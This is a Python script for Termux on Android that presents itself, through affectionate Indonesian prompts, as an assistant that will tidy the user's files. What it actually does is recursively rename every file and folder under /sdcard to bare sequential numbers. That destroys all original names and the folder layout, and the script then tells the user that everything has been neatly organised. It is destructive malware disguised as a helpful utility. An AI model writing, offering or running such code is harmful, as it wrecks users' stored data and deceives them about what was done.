import os
import sys
import time

TARGET_DIR = "/sdcard" 

def execute_ultimate_rename():
    
    if not os.path.isdir(TARGET_DIR):
        return -1, 0

    items_to_rename = []
    
    for root, dirs, files in os.walk(TARGET_DIR, topdown=False):
        
        for file in files:
            old_path = os.path.join(root, file)
            _, ext = os.path.splitext(file)
            
            if old_path == os.path.realpath(__file__) or ext.lower() in ('.py', '.pyc', '.sh'):
                continue
            
            items_to_rename.append({'path': old_path, 'ext': ext})
            
        for folder in dirs:
            old_path = os.path.join(root, folder)
            if old_path == TARGET_DIR or old_path.startswith("/data/"):
                continue
            items_to_rename.append({'path': old_path, 'ext': ''})
            
    total_items = len(items_to_rename)
    
    renamed_count = 0
    counter = 1
    
    for item in items_to_rename:
        old_path = item['path']
        old_ext = item['ext']
        
        final_new_name = str(counter) + old_ext
        
        new_path = os.path.join(os.path.dirname(old_path), final_new_name)
        
        if os.path.exists(new_path) and os.path.isfile(new_path):
            final_new_name = str(counter) + os.urandom(2).hex() + old_ext
            new_path = os.path.join(os.path.dirname(old_path), final_new_name)
            
        if old_path != new_path:
            try:
                os.rename(old_path, new_path)
                renamed_count += 1
                counter += 1
            except Exception:
                pass 
            
    return renamed_count, total_items


def main():
    
    os.system('termux-setup-storage')
    os.system('clear')

    try:
        while True:
            
            print("Hai sayang! Mau dibantu rapikan file-file kamu?")
            print("Asisten siap merapikan file di seluruh memori /sdcard.")
            
            choice = input("Lanjutkan proses rapikan? (y/n): ").strip().lower()

            if choice == 'n':
                print("Oke sayang! Kapan-kapan panggil aku lagi ya! Muach!")
                time.sleep(2)
                sys.exit(0)

            elif choice == 'y':
                
                print("sabar ya sayang~ lagi rapiin file file kamu~*")
                
                renamed_count, total_items = execute_ultimate_rename()
                
                if renamed_count == -1:
                     print("Ups! Asisten gagal akses memori. Coba lagi ya!")
                elif renamed_count == 0:
                     print("selesai sayang! Semua file sudah rapi!")
                else:
                    print("selesai sayang! Semua file sudah rapi!")
                
                print("Mau rapiin lagi? Tekan ENTER ya.")
                input() 
            
            else:
                print("Hmm, pilihanmu tidak jelas. Coba lagi ya.")
                time.sleep(2)
                continue

    except KeyboardInterrupt:
        print("Sampai jumpa lagi sayang! Aku tunggu panggilanmu! *Hugs*")
        time.sleep(2)
        sys.exit(0)

if __name__ == "__main__":
    main()
